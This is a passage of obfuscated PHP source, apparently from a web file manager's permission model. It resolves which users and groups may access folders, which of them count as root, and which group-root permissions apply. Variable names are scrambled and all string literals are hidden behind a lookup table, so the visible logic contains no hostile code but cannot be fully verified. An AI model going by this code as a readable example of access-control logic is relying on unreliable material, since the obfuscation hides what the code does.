$this->where(array($ØöÌÇÏƒ[502] => array($ØöÌÇÏƒ[503], $ÙŞÜÅø)))->delete(); return !0; } public function getAllChildren($æ÷÷ ®Ó) { $ïê¡¡íà =& $_SERVER[äô®•½Â]; $Å™ì¥ÆØ = Model($ïê¡¡íà[1426])->sourceInfo($æ÷÷ ®Ó); if ($Å™ì¥ÆØ[$ïê¡¡íà[496]] != $ïê¡¡íà[91]) { return $this->sourceListAuth(array($æ÷÷ ®Ó)); } if ($Å™ì¥ÆØ[$ïê¡¡íà[191]] != SourceModel::TYPE_GROUP) { return array(); } $‘şŞÒ‘ã = 1; $Š¨¶³´ = array($æ÷÷ ®Ó); if ($Å™ì¥ÆØ[$ïê¡¡íà[193]] == $ïê¡¡íà[231] && $Å™ì¥ÆØ[$ïê¡¡íà[582]] != $‘şŞÒ‘ã) { $Š¨¶³´ = $this->groupChidldAllRootSource($Å™ì¥ÆØ[$ïê¡¡íà[582]]); } $£ÑÂìàµ = $this->field($ïê¡¡íà[194])->group($ïê¡¡íà[194])->select(); $£ÑÂìàµ = array_to_keyvalue($£ÑÂìàµ, $ïê¡¡íà[12], $ïê¡¡íà[194]); if (!$£ÑÂìàµ) { return array(); } $´õá÷Å¥ = $ïê¡¡íà[2171]; $’èĞñòÜ = array($ïê¡¡íà[194] => array($ïê¡¡íà[7], $£ÑÂìàµ), $ïê¡¡íà[516] => $ïê¡¡íà[231]); $Ùàêú´— = Model($ïê¡¡íà[896])->field($´õá÷Å¥)->where($’èĞñòÜ)->select(); $Î¶Â¤òÌ = array($æ÷÷ ®Ó); foreach ($Ùàêú´— as $Ã÷òºúé) { foreach ($Š¨¶³´ as $å††Êˆ¯) { $Ú”û…Ñ­ = $ïê¡¡íà[50] . $å††Êˆ¯ . $ïê¡¡íà[50]; $øıÓôàÉ = $Ã÷òºúé[$ïê¡¡íà[597]] . $Ã÷òºúé[$ïê¡¡íà[194]] . $ïê¡¡íà[50]; if (strstr($øıÓôàÉ, $Ú”û…Ñ­)) { $Î¶Â¤òÌ[] = $Ã÷òºúé[$ïê¡¡íà[194]]; break; } } } return $this->sourceListAuth($Î¶Â¤òÌ); } private function sourceListAuth($÷µ¦ö¾) { $®²Ÿ£‰ =& $_SERVER[äô®•½Â]; $§Ö¨öèİ = Model($®²Ÿ£‰[1426])->sourceListInfo($÷µ¦ö¾, !0); $¤ç£¤ö = $this->sourceAuthSelect($÷µ¦ö¾); $¡¾œÛø³ = array(); $Å­ÊğæÂ = array(); foreach ($§Ö¨öèİ as $Çõ¨¬é) { unset($Çõ¨¬é[$®²Ÿ£‰[540]]); unset($Çõ¨¬é[$®²Ÿ£‰[538]]); unset($Çõ¨¬é[$®²Ÿ£‰[498]]); unset($Çõ¨¬é[$®²Ÿ£‰[90]]); $¼¹Çà¸ = $¤ç£¤ö[$Çõ¨¬é[$®²Ÿ£‰[194]]]; if (!$¼¹Çà¸) { continue; } $Çõ¨¬é[$®²Ÿ£‰[2172]] = $this->authTargetInfo($¼¹Çà¸); $Çõ¨¬é[$®²Ÿ£‰[595]] = rtrim($Çõ¨¬é[$®²Ÿ£‰[601]], $®²Ÿ£‰[8]) . $®²Ÿ£‰[8] . ltrim($Çõ¨¬é[$®²Ÿ£‰[595]], $®²Ÿ£‰[8]); $¡¾œÛø³[] = $Çõ¨¬é; $åû‚Â­ = count(explode($®²Ÿ£‰[8], trim($Çõ¨¬é[$®²Ÿ£‰[595]], $®²Ÿ£‰[8]))); $Å­ÊğæÂ[] = $åû‚Â­ + ($Çõ¨¬é[$®²Ÿ£‰[33]] == $®²Ÿ£‰[78] ? 0 : 1000); } array_multisort($Å­ÊğæÂ, SORT_ASC, $¡¾œÛø³); return $¡¾œÛø³; } private function groupChidldAllRootSource($®¾¼â) { $Àì‚»‰« =& $_SERVER[äô®•½Â]; $ºˆ°•Ğ› = Model($Àì‚»‰«[1386])->groupChildrenAll($®¾¼â); $ºàÈê½Ä = array($Àì‚»‰«[193] => 0, $Àì‚»‰«[582] => array($Àì‚»‰«[7], $ºˆ°•Ğ›), $Àì‚»‰«[191] => SourceModel::TYPE_GROUP); $Çµ·Àù = Model($Àì‚»‰«[896])->field($Àì‚»‰«[194])->where($ºàÈê½Ä)->select(); $Çµ·Àù = array_to_keyvalue($Çµ·Àù, $Àì‚»‰«[12], $Àì‚»‰«[194]); return $Çµ·Àù; } private function authTargetInfo($¨ÈªÚ„í) { $ù±°ÅÏ° =& $_SERVER[äô®•½Â]; $šüÄÅ™² = array(); $øãÖ€ß = array(); $ÃÈ¨¨Çî = 2 << 25; foreach ($¨ÈªÚ„í as $š±Ø¯Å¬) { $İò³ÂÆ = Model($ù±°ÅÏ°[584])->listData($š±Ø¯Å¬[$ù±°ÅÏ°[2086]]); if (!$İò³ÂÆ) { continue; } if ($š±Ø¯Å¬[$ù±°ÅÏ°[191]] == SourceModel::TYPE_USER) { $Ò¯ƒŠ± = Model($ù±°ÅÏ°[590])->getInfoSimpleOuter($š±Ø¯Å¬[$ù±°ÅÏ°[582]]); if ($Ò¯ƒŠ±[$ù±°ÅÏ°[1777]] == $ù±°ÅÏ°[1271]) { continue; } if ($Ò¯ƒŠ±[$ù±°ÅÏ°[1777]] == $ù±°ÅÏ°[231]) { $Ò¯ƒŠ±[$ù±°ÅÏ°[32]] = LNG($ù±°ÅÏ°[2173]); } } else { $Ò¯ƒŠ± = Model($ù±°ÅÏ°[598])->getInfoSimple($š±Ø¯Å¬[$ù±°ÅÏ°[582]]); } if (!$Ò¯ƒŠ±) { continue; } $Ò¯ƒŠ±[$ù±°ÅÏ°[553]] = $İò³ÂÆ; $šüÄÅ™²[] = $Ò¯ƒŠ±; $“´Ù÷š = 0; if ($š±Ø¯Å¬[$ù±°ÅÏ°[191]] == SourceModel::TYPE_GROUP) { $“´Ù÷š = $ÃÈ¨¨Çî * 2; } if ($š±Ø¯Å¬[$ù±°ÅÏ°[191]] == SourceModel::TYPE_USER) { $“´Ù÷š = $ÃÈ¨¨Çî; } if ($š±Ø¯Å¬[$ù±°ÅÏ°[191]] == SourceModel::TYPE_USER && $š±Ø¯Å¬[$ù±°ÅÏ°[582]] == $ù±°ÅÏ°[231]) { $“´Ù÷š = 0; } $øãÖ€ß[] = $İò³ÂÆ[$ù±°ÅÏ°[498]] + $“´Ù÷š; } array_multisort($øãÖ€ß, SORT_DESC, $šüÄÅ™²); return $šüÄÅ™²; } public function getAllChildrenByUser($Ÿ¾ƒ˜‚¥, $¥Æ÷äˆ«) { $ßÙĞùÂë =& $_SERVER[äô®•½Â]; $·ş‰ó÷¿ = Model($ßÙĞùÂë[610])->getInfo($¥Æ÷äˆ«); if (!$¥Æ÷äˆ« || !$Ÿ¾ƒ˜‚¥ || !$·ş‰ó÷¿) { return array(); } $÷Ç¡ı = Model($ßÙĞùÂë[1426])->sourceInfo($Ÿ¾ƒ˜‚¥); $ …ƒåû = array(); $ÛÊç»Êû = 1; if ($÷Ç¡ı[$ßÙĞùÂë[193]] == $ßÙĞùÂë[231] && $÷Ç¡ı[$ßÙĞùÂë[582]] != $ÛÊç»Êû && $this->groupContainUser($÷Ç¡ı[$ßÙĞùÂë[582]], $¥Æ÷äˆ«)) { foreach ($·ş‰ó÷¿[$ßÙĞùÂë[1387]] as $ ãÙÏ ) { $ùÁ¡‹¿¿ = Model($ßÙĞùÂë[598])->getInfo($ ãÙÏ [$ßÙĞùÂë[1388]]); $Œ´Ë”„½ = Model($ßÙĞùÂë[610])->getInfoSimpleOuter($¥Æ÷äˆ«); $Œ´Ë”„½[$ßÙĞùÂë[553]] = $ ãÙÏ [$ßÙĞùÂë[498]]; if (Model($ßÙĞùÂë[584])->authCheckAction($ ãÙÏ [$ßÙĞùÂë[498]][$ßÙĞùÂë[498]], $ßÙĞùÂë[1998])) { continue; } $¾²îÔÁ” = array($ßÙĞùÂë[32] => $ßÙĞùÂë[1291] . $ùÁ¡‹¿¿[$ßÙĞùÂë[32]], $ßÙĞùÂë[194] => $ùÁ¡‹¿¿[$ßÙĞùÂë[90]][$ßÙĞùÂë[194]], $ßÙĞùÂë[87] => KodIO::make($ùÁ¡‹¿¿[$ßÙĞùÂë[90]][$ßÙĞùÂë[194]]), $ßÙĞùÂë[193] => $ßÙĞùÂë[231], $ßÙĞùÂë[191] => $ßÙĞùÂë[591], $ßÙĞùÂë[33] => $ßÙĞùÂë[632], $ßÙĞùÂë[595] => $ùÁ¡‹¿¿[$ßÙĞùÂë[602]], $ßÙĞùÂë[1388] => $ùÁ¡‹¿¿[$ßÙĞùÂë[1388]], $ßÙĞùÂë[599] => $ùÁ¡‹¿¿[$ßÙĞùÂë[193]], $ßÙĞùÂë[2172] => array($Œ´Ë”„½)); $ …ƒåû[$¾²îÔÁ”[$ßÙĞùÂë[194]]] = $¾²îÔÁ”; } } $¬İıªª‹ = array(); $ŠçâåòÂ = $this->getAllChildren($Ÿ¾ƒ˜‚¥); foreach ($ŠçâåòÂ as $èùñåà) { $Ò™ÍÓ¡ä = !1; foreach ($èùñåà[$ßÙĞùÂë[2172]] as $ÏŠÚ—ºº) { if ($ÏŠÚ—ºº[$ßÙĞùÂë[1777]]) { if ($ÏŠÚ—ºº[$ßÙĞùÂë[1777]] == $¥Æ÷äˆ«) { $Ò™ÍÓ¡ä = !0; break; } } if ($ÏŠÚ—ºº[$ßÙĞùÂë[1388]]) { if ($this->groupContainUser($ÏŠÚ—ºº[$ßÙĞùÂë[1388]], $¥Æ÷äˆ«)) { $Ò™ÍÓ¡ä = !0; break; } } } if ($Ò™ÍÓ¡ä) { $¬İıªª‹[] = $èùñåà; } $Œ—Í«¡‡ = $èùñåà[$ßÙĞùÂë[194]]; if (isset($ …ƒåû[$Œ—Í«¡‡])) { $èùñåà[$ßÙĞùÂë[2172]][] = $ …ƒåû[$Œ—Í«¡‡][0]; $ …ƒåû[$Œ—Í«¡‡] = !1; } } $ …ƒåû = array_filter(array_values($ …ƒåû)); $¬İıªª‹ = array_merge($ …ƒåû, $¬İıªª‹); return $¬İıªª‹; } public function setAllChildrenByUser($Ë‹º¨³ş, $Ì¦¦ ›Ö, $®ëôıìâ) { $Æ¶èİ­¦ =& $_SERVER[äô®•½Â]; $¯ÍÊ•úÏ = $this->getAllChildrenByUser($Ë‹º¨³ş, $Ì¦¦ ›Ö); if (!$®ëôıìâ || !$¯ÍÊ•úÏ) { return !1; } foreach ($¯ÍÊ•úÏ as $çÀÕ´§) { $ëší§ˆ€ = array(); foreach ($çÀÕ´§[$Æ¶èİ­¦[2172]] as $¤Ë½Úå©) { $œÕÄ«„Ü = $¤Ë½Úå©[$Æ¶èİ­¦[553]]; $Ñ±àÇ‘Û = $¤Ë½Úå©[$Æ¶èİ­¦[1777]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $¥â¾ıİ— = $¤Ë½Úå©[$Æ¶èİ­¦[1777]] ? $¤Ë½Úå©[$Æ¶èİ­¦[1777]] : $¤Ë½Úå©[$Æ¶èİ­¦[1388]]; if ($¤Ë½Úå©[$Æ¶èİ­¦[1777]] && $¤Ë½Úå©[$Æ¶èİ­¦[1777]] == $Ì¦¦ ›Ö) { continue; } $ëší§ˆ€[] = array($Æ¶èİ­¦[194] => $çÀÕ´§[$Æ¶èİ­¦[194]], $Æ¶èİ­¦[191] => $Ñ±àÇ‘Û, $Æ¶èİ­¦[582] => intval($¥â¾ıİ—), $Æ¶èİ­¦[2086] => isset($œÕÄ«„Ü[$Æ¶èİ­¦[486]]) ? intval($œÕÄ«„Ü[$Æ¶èİ­¦[486]]) : 0, $Æ¶èİ­¦[2149] => isset($œÕÄ«„Ü[$Æ¶èİ­¦[2149]]) ? intval($œÕÄ«„Ü[$Æ¶èİ­¦[2149]]) : -1); } $ëší§ˆ€[] = array($Æ¶èİ­¦[194] => $çÀÕ´§[$Æ¶èİ­¦[194]], $Æ¶èİ­¦[191] => SourceModel::TYPE_USER, $Æ¶èİ­¦[582] => intval($Ì¦¦ ›Ö), $Æ¶èİ­¦[2086] => intval($®ëôıìâ), $Æ¶èİ­¦[2149] => -1); $this->where(array($Æ¶èİ­¦[502] => $çÀÕ´§[$Æ¶èİ­¦[194]]))->delete(); $this->addAll($ëší§ˆ€); } return !0; } public function get($”şÁ‚ÃÌ) { $’¼©”Ô = $this->getSourceList(array($”şÁ‚ÃÌ), !0); return $’¼©”Ô[0]; } public function getSourceList($­œé…Ç˜, $©Øï£š = false, $áÜ¾ÒÆÒ = false) { $¦‘ÀáÄÌ =& $_SERVER[äô®•½Â]; if (!$­œé…Ç˜) { return array(); } $±Œ¼“éˆ = Model($¦‘ÀáÄÌ[1426]); if (!$©Øï£š && count($­œé…Ç˜) == 1) { $©Øï£š = array(); $©Øï£š[$­œé…Ç˜[0]] = $±Œ¼“éˆ->sourceInfo($­œé…Ç˜[0]); } if (!$©Øï£š) { $óè²Æ¾À = array($¦‘ÀáÄÌ[502] => array($¦‘ÀáÄÌ[503], $­œé…Ç˜)); $©Øï£š = $±Œ¼“éˆ->field($¦‘ÀáÄÌ[2174])->where($óè²Æ¾À)->select(); $©Øï£š = array_to_keyvalue($©Øï£š, $¦‘ÀáÄÌ[194]); } $ü•à¬â¿ = $­œé…Ç˜; foreach ($©Øï£š as $øğÕ™ÎÌ => $ƒ‹ÏÖŞ) { $ü¿Õé„ = $±Œ¼“éˆ->parentLevelArray($ƒ‹ÏÖŞ[$¦‘ÀáÄÌ[597]]); $ü•à¬â¿ = array_merge($ü•à¬â¿, array(intval($øğÕ™ÎÌ)), array_reverse($ü¿Õé„)); } $ü•à¬â¿ = array_values(array_unique($ü•à¬â¿)); if (!$ü•à¬â¿) { return array(); } $î–•´¯ = $this->sourceAuthSelect($ü•à¬â¿); $ô¨ŞÀÏ = array(); foreach ($ü•à¬â¿ as $ôâˆ¨ô£) { if (isset($î–•´¯[$ôâˆ¨ô£])) { $ô¨ŞÀÏ[$ôâˆ¨ô£] = $î–•´¯[$ôâˆ¨ô£]; } } $ª­Ó”¨ = $this->userIsRoot($áÜ¾ÒÆÒ); $Ï€ä¿¨¡ = AuthModel::authAll(); $Œ×«®À° = array($¦‘ÀáÄÌ[499] => $Ï€ä¿¨¡, $¦‘ÀáÄÌ[2175] => array($¦‘ÀáÄÌ[504] => 0, $¦‘ÀáÄÌ[1983] => $Ï€ä¿¨¡, $¦‘ÀáÄÌ[505] => LNG($¦‘ÀáÄÌ[2176]), $¦‘ÀáÄÌ[2000] => $¦‘ÀáÄÌ[2177])); $Îáğ½æÔ = array(); foreach ($©Øï£š as $ôâˆ¨ô£ => $æ–Ç€) { if ($ª­Ó”¨ && $GLOBALS[$¦‘ÀáÄÌ[6]][$¦‘ÀáÄÌ[1996]]) { $Îáğ½æÔ[$ôâˆ¨ô£] = $Œ×«®À°; continue; } $Îáğ½æÔ[$ôâˆ¨ô£] = $this->makeSourceAuth($æ–Ç€, $ô¨ŞÀÏ, $áÜ¾ÒÆÒ); } return $Îáğ½æÔ; } public function authDeepCheck($›íıÁÌœ, $†´ì¨í´ = false) { $ğ¾ûúœü =& $_SERVER[äô®•½Â]; $†´ì¨í´ = $†´ì¨í´ ? $†´ì¨í´ : USER_ID; $ú°èˆ˜æ = $this->makeAuthDeep($†´ì¨í´); if (!in_array($›íıÁÌœ, $ú°èˆ˜æ[$ğ¾ûúœü[2178]])) { return !1; } $„Ø™¦Õ = array(); foreach ($ú°èˆ˜æ[$ğ¾ûúœü[2179]] as $Èí”å€– => $¿€Õ­Œö) { if (!in_array($›íıÁÌœ, $¿€Õ­Œö)) { continue; } $„Ø™¦Õ[] = $Èí”å€–; } if (!$„Ø™¦Õ) { return !1; } $ŠÁ©«†Œ = $„Ø™¦Õ ? $„Ø™¦Õ[0] : $›íıÁÌœ; return array($ğ¾ûúœü[499] => -1, $ğ¾ûúœü[553] => array($ğ¾ûúœü[504] => $ğ¾ûúœü[1271], $ğ¾ûúœü[1983] => $ğ¾ûúœü[231], $ğ¾ûúœü[505] => LNG($ğ¾ûúœü[2180]), $ğ¾ûúœü[2000] => $ğ¾ûúœü[2181]), $ğ¾ûúœü[2182] => LNG($ğ¾ûúœü[2183]), $ğ¾ûúœü[2184] => $this->sourceAuthInfo($ŠÁ©«†Œ)); } protected function makeAuthDeep($®øÍ¨ñ… = false) { $»ï‚ ¢¶ =& $_SERVER[äô®•½Â]; static $°ÁÖ¤Ü¬ = array(); $®øÍ¨ñ… = $®øÍ¨ñ… ? $®øÍ¨ñ… : USER_ID; if (isset($°ÁÖ¤Ü¬[$®øÍ¨ñ…])) { return $°ÁÖ¤Ü¬[$®øÍ¨ñ…]; } $¹Øì°¯– = Model($»ï‚ ¢¶[2185])->listData(); $‚ˆ“îÏ– = array(); foreach ($¹Øì°¯– as $ŒÂƒÈŒ) { if ($ŒÂƒÈŒ[$»ï‚ ¢¶[498]] == 0 && $ŒÂƒÈŒ[$»ï‚ ¢¶[1999]] == $»ï‚ ¢¶[91]) { $‚ˆ“îÏ–[] = $ŒÂƒÈŒ[$»ï‚ ¢¶[486]]; } } $„ÇøèÑ = $this->userGroupParents($®øÍ¨ñ…); $„áçå¤î = array($»ï‚ ¢¶[191] => SourceModel::TYPE_USER, $»ï‚ ¢¶[582] => $®øÍ¨ñ…); if ($„ÇøèÑ) { $„áçå¤î = array(array($»ï‚ ¢¶[191] => SourceModel::TYPE_USER, $»ï‚ ¢¶[582] => $®øÍ¨ñ…), array($»ï‚ ¢¶[191] => SourceModel::TYPE_GROUP, $»ï‚ ¢¶[582] => array($»ï‚ ¢¶[503], $„ÇøèÑ)), $»ï‚ ¢¶[1072] => $»ï‚ ¢¶[2080]); } $†ÀÔëŠÊ = $this->field($»ï‚ ¢¶[2186])->where($„áçå¤î)->select(); $«î¥ü„å = array(); $¿ç×•‡ş = array_to_keyvalue_group($†ÀÔëŠÊ, $»ï‚ ¢¶[194]); foreach ($¿ç×•‡ş as $¿Şò¬Ã± => $èÜü¨¹Ç) { $İŠÁø¨Š = $this->authArrayCheck($èÜü¨¹Ç, $®øÍ¨ñ…); if ($İŠÁø¨Š[$»ï‚ ¢¶[499]] > 0) { $«î¥ü„å[] = $¿Şò¬Ã± . $»ï‚ ¢¶[12]; } } if ($„ÇøèÑ) { $ş´…ï™’ = Model($»ï‚ ¢¶[598]); foreach ($„ÇøèÑ as $ô©ï²àÛ) { $µÁÑ¢‡™ = $ş´…ï™’->getInfo($ô©ï²àÛ); if (!$µÁÑ¢‡™ || !is_array($µÁÑ¢‡™[$»ï‚ ¢¶[90]])) { continue; } $«î¥ü„å[] = $µÁÑ¢‡™[$»ï‚ ¢¶[90]][$»ï‚ ¢¶[194]]; } } $„à›æ§» = array(); $Ş½œõæÆ = $„ÇøèÑ; $¡ÊùªËì = Model($»ï‚ ¢¶[1426]); $ş´…ï™’ = Model($»ï‚ ¢¶[598]); $ä¬•ûï = array(); $õºåŞ‡ = array(); $ÇÕÚ“¾å = array(); $ÊÓ™Ñ¥ = array(); if ($«î¥ü„å) { $¡®…†£« = $¡ÊùªËì->where(array($»ï‚ ¢¶[194] => array($»ï‚ ¢¶[503], $«î¥ü„å)))->select(); foreach ($¡®…†£« as $ØÉ¶²Å») { if ($ØÉ¶²Å»[$»ï‚ ¢¶[516]] == $»ï‚ ¢¶[91]) { continue; } $öæª¾™€ = $¡ÊùªËì->parentLevelArray($ØÉ¶²Å»[$»ï‚ ¢¶[597]]); $„à›æ§» = array_merge($„à›æ§», $öæª¾™€); $Ş½œõæÆ[] = $ØÉ¶²Å»[$»ï‚ ¢¶[582]]; $ä¬•ûï[$ØÉ¶²Å»[$»ï‚ ¢¶[194]]] = $öæª¾™€; $õºåŞ‡[$ØÉ¶²Å»[$»ï‚ ¢¶[194]]] = $ØÉ¶²Å»[$»ï‚ ¢¶[582]]; } } $Ş½œõæÆ = array_values(array_unique($Ş½œõæÆ)); $İıÀ¦ß© = $Ş½œõæÆ; foreach ($İıÀ¦ß© as $ô©ï²àÛ) { $µÁÑ¢‡™ = $ş´…ï™’->getInfo($ô©ï²àÛ); $öæª¾™€ = $¡ÊùªËì->parentLevelArray($µÁÑ¢‡™[$»ï‚ ¢¶[597]]); $Ş½œõæÆ = array_merge($Ş½œõæÆ, $öæª¾™€); } $Ş½œõæÆ = array_values(array_unique($Ş½œõæÆ)); foreach ($Ş½œõæÆ as $ô©ï²àÛ) { $µÁÑ¢‡™ = $ş´…ï™’->getInfo($ô©ï²àÛ); $„à›æ§»[] = $µÁÑ¢‡™[$»ï‚ ¢¶[90]][$»ï‚ ¢¶[194]]; $ÇÕÚ“¾å[$ô©ï²àÛ] = $µÁÑ¢‡™[$»ï‚ ¢¶[90]][$»ï‚ ¢¶[194]]; $ÊÓ™Ñ¥[$ô©ï²àÛ] = $¡ÊùªËì->parentLevelArray($µÁÑ¢‡™[$»ï‚ ¢¶[597]]); } foreach ($ä¬•ûï as $­Â®ü†• => $Øæ¼ğöÚ) { $™¦ä„Å = $õºåŞ‡[$­Â®ü†•]; if (!$™¦ä„Å || !$ÇÕÚ“¾å[$™¦ä„Å]) { continue; } $× ÓëÜŸ = array(); foreach ($ÊÓ™Ñ¥[$™¦ä„Å] as $ô©ï²àÛ) { $× ÓëÜŸ[] = $ÇÕÚ“¾å[$ô©ï²àÛ]; } $ä¬•ûï[$­Â®ü†•] = array_merge($× ÓëÜŸ, $Øæ¼ğöÚ); } $„à›æ§» = array_values(array_unique($„à›æ§»)); $­¹¨Ô½¥ = array($»ï‚ ¢¶[2178] => $„à›æ§», $»ï‚ ¢¶[2179] => $ä¬•ûï); $°ÁÖ¤Ü¬[$®øÍ¨ñ…] = $­¹¨Ô½¥; return $­¹¨Ô½¥; } private function makeSourceAuth($†ÇÕÕ“›, $Ë°Ì«Ÿ¢, $õ¦†Ó Ó = false) { $ù”«ÕÚ =& $_SERVER[äô®•½Â]; $‡•˜¾Âæ = $ù”«ÕÚ[91]; $¯ø¢¥ËÏ = $†ÇÕÕ“›[$ù”«ÕÚ[582]]; $Ä©şĞ‰Œ = $†ÇÕÕ“›[$ù”«ÕÚ[191]] == SourceModel::TYPE_GROUP; $ú†Üı‚„ = $Ä©şĞ‰Œ ? $this->groupRootAuth($¯ø¢¥ËÏ, $õ¦†Ó Ó) : !1; if ($ú†Üı‚„ && Model($ù”«ÕÚ[584])->authCheckAction($ú†Üı‚„[$ù”«ÕÚ[498]], $ù”«ÕÚ[1998])) { return $this->groupAuthInfo($ú†Üı‚„, $¯ø¢¥ËÏ); } $şƒ÷ÑîÆ = Model($ù”«ÕÚ[1426])->parentLevelArray($†ÇÕÕ“›[$ù”«ÕÚ[597]]); $şƒ÷ÑîÆ = array_merge(array($†ÇÕÕ“›[$ù”«ÕÚ[194]]), array_reverse($şƒ÷ÑîÆ)); $©Òâ¶› = !1; foreach ($şƒ÷ÑîÆ as $ğñ¸Š†Ê) { if (!isset($Ë°Ì«Ÿ¢[$ğñ¸Š†Ê])) { continue; } $ĞØ˜ÂÏ = $this->authMake($Ë°Ì«Ÿ¢[$ğñ¸Š†Ê], $õ¦†Ó Ó); if ($ĞØ˜ÂÏ[$ù”«ÕÚ[553]]) { $©Òâ¶› = $ĞØ˜ÂÏ; break; } } if (!$Ä©şĞ‰Œ) { return $©Òâ¶›; } if (!$©Òâ¶› && $ú†Üı‚„) { $©Òâ¶› = $this->groupAuthInfo($ú†Üı‚„, $¯ø¢¥ËÏ); } if (!$©Òâ¶›) { $ŒœßŠ³¥ = Model($ù”«ÕÚ[598])->getInfo($¯ø¢¥ËÏ); $œÙàŒ¸“ = explode($ù”«ÕÚ[50], trim($ŒœßŠ³¥[$ù”«ÕÚ[597]], $ù”«ÕÚ[50])); $œÙàŒ¸“ = array_reverse($œÙàŒ¸“); foreach ($œÙàŒ¸“ as $ÔÚÖ½÷) { if ($ÔÚÖ½÷ == $ù”«ÕÚ[231] || $ÔÚÖ½÷ == $‡•˜¾Âæ) { continue; } $¤Û³Ø‡ô = $this->groupRootAuth($ÔÚÖ½÷, $õ¦†Ó Ó); if (!$¤Û³Ø‡ô) { continue; } $©Òâ¶› = $this->groupAuthInfo($¤Û³Ø‡ô, $ÔÚÖ½÷); break; } } if (!$©Òâ¶› || $©Òâ¶›[$ù”«ÕÚ[499]] <= 0) { $şÓóÑ•µ = $this->authDeepCheck($†ÇÕÕ“›[$ù”«ÕÚ[194]], $õ¦†Ó Ó); if ($şÓóÑ•µ) { $©Òâ¶› = $şÓóÑ•µ; } } return $©Òâ¶›; } private function userIsRoot($Æ•¬¯š = false) { $ÙŸ•–›¡ =& $_SERVER[äô®•½Â]; if (!$Æ•¬¯š && KodUser::isRoot()) { return !0; } $ÜãÂçîĞ = Model($ÙŸ•–›¡[610])->getInfo($Æ•¬¯š); $¾ô·Ÿ†À = Model($ÙŸ•–›¡[2187])->listData($ÜãÂçîĞ[$ÙŸ•–›¡[2188]]); if ($¾ô·Ÿ†À && $¾ô·Ÿ†À[$ÙŸ•–›¡[588]][$ÙŸ•–›¡[2189]] == 1) { return !0; } return !1; } private function sourceAuthInfo($’¾±­«¶) { $Çâ÷ÒŒ½ =& $_SERVER[äô®•½Â]; $ÈŠáè­í = Model($Çâ÷ÒŒ½[1426]); $’’Ç¯¬Í = $ÈŠáè­í->sourceInfo($’¾±­«¶); if (!$’’Ç¯¬Í) { return !1; } $ÈŠáè­í->groupPathDisplay($’’Ç¯¬Í); $×Á…ôÓó = array($’’Ç¯¬Í); $×Á…ôÓó = $ÈŠáè­í->_listAppendPath($×Á…ôÓó); $’’Ç¯¬Í = $×Á…ôÓó[0]; $÷“á²Óã = $’’Ç¯¬Í[$Çâ÷ÒŒ½[595]]; if (isset($’’Ç¯¬Í[$Çâ÷ÒŒ½[603]])) { $±ı¦ù‡õ = explode($Çâ÷ÒŒ½[8], trim($’’Ç¯¬Í[$Çâ÷ÒŒ½[595]], $Çâ÷ÒŒ½[8])); array_shift($±ı¦ù‡õ); $÷“á²Óã = $’’Ç¯¬Í[$Çâ÷ÒŒ½[601]] . $Çâ÷ÒŒ½[2190] . implode($Çâ÷ÒŒ½[8], $±ı¦ù‡õ); } return array($Çâ÷ÒŒ½[505] => $’’Ç¯¬Í[$Çâ÷ÒŒ½[32]], $Çâ÷ÒŒ½[87] => KodIO::make($’’Ç¯¬Í[$Çâ÷ÒŒ½[194]]), $Çâ÷ÒŒ½[2191] => $÷“á²Óã); } private function groupAuthInfo($÷‘âñâç, $…ã—î) { $®èş‘àà =& $_SERVER[äô®•½Â]; $à¹§Å„ = Model($®èş‘àà[598])->getInfo($…ã—î); return array($®èş‘àà[2192] => intval($÷‘âñâç[$®èş‘àà[498]]), $®èş‘àà[2175] => $÷‘âñâç, $®èş‘àà[2193] => LNG($®èş‘àà[2194]), $®èş‘àà[2184] => array($®èş‘àà[505] => $à¹§Å„[$®èş‘àà[32]], $®èş‘àà[87] => KodIO::make($à¹§Å„[$®èş‘àà[90]][$®èş‘àà[194]]), $®èş‘àà[2191] => $à¹§Å„[$®èş‘àà[602]])); } protected function groupRootAuth($ÇêªĞÇ¡, $­ıÕ’ˆ¨ = false) { $µ‰»ê§˜ =& $_SERVER[äô®•½Â]; $­ıÕ’ˆ¨ = $­ıÕ’ˆ¨ ? $­ıÕ’ˆ¨ : USER_ID; $Ûë»ßÆÉ = $­ıÕ’ˆ¨ . $µ‰»ê§˜[2195] . $ÇêªĞÇ¡; static $Â¯Î˜Ó = array(); if (isset($Â¯Î˜Ó[$Ûë»ßÆÉ])) { return $Â¯Î˜Ó[$Ûë»ßÆÉ]; } $¸İ“ Íæ = Model($µ‰»ê§˜[598])->getInfo($ÇêªĞÇ¡); $„Ù£Š‡ = $this->userGroupList($­ıÕ’ˆ¨); $¶èÄØÂ” = isset($„Ù£Š‡[$ÇêªĞÇ¡]) ? $„Ù£Š‡[$ÇêªĞÇ¡][$µ‰»ê§˜[498]] : !1; if ($¶èÄØÂ” && Model($µ‰»ê§˜[584])->authCheckAction($¶èÄØÂ”[$µ‰»ê§˜[498]], $µ‰»ê§˜[1998])) { $Â¯Î˜Ó[$Ûë»ßÆÉ] = $¶èÄØÂ”; return $¶èÄØÂ”; } $²À¦×ìÈ = $this->sourceAuthSelect($¸İ“ Íæ[$µ‰»ê§˜[90]][$µ‰»ê§˜[194]]); $˜šŒ±‘— = $²À¦×ìÈ ? $this->authMake($²À¦×ìÈ, $­ıÕ’ˆ¨) : !1; $¶å‰êó = $˜šŒ±‘— ? $˜šŒ±‘—[$µ‰»ê§˜[553]] : !1; $Â¯Î˜Ó[$Ûë»ßÆÉ] = $¶å‰êó ? $¶å‰êó : $¶èÄØÂ”; return $Â¯Î˜Ó[$Ûë»ßÆÉ]; } public function authOwnerApply($ê‹éŞ) { $¨¾Â¼‡ =& $_SERVER[äô®•½Â]; if (empty($ê‹éŞ[$¨¾Â¼‡[498]]) || isset($ê‹éŞ[$¨¾Â¼‡[2196]]) && $ê‹éŞ[$¨¾Â¼‡[2196]]) { return $ê‹éŞ; } if (AuthModel::authCheckRoot($ê‹éŞ[$¨¾Â¼‡[498]][$¨¾Â¼‡[499]])) { return $ê‹éŞ; } $Ğ½õòºö = Model($¨¾Â¼‡[1426])->parentLevelArray($ê‹éŞ[$¨¾Â¼‡[597]]); $Ğ½õòºö = array_merge(array($ê‹éŞ[$¨¾Â¼‡[194]]), array_reverse($Ğ½õòºö)); $ö¡øÜãû = $this->sourceAuthSelect($Ğ½õòºö); $™´»úÒ” = array(); $ÖñÊä“® = array(); foreach ($ö¡øÜãû as $éÁ¶Èšı => $ÎÅö”¢º) { $¶áèöÊ‰ = $this->authFolderOwnerUser($ÎÅö”¢º); $™´»úÒ”[$éÁ¶Èšı] = $¶áèöÊ‰; $ÖñÊä“® = array_merge($ÖñÊä“®, 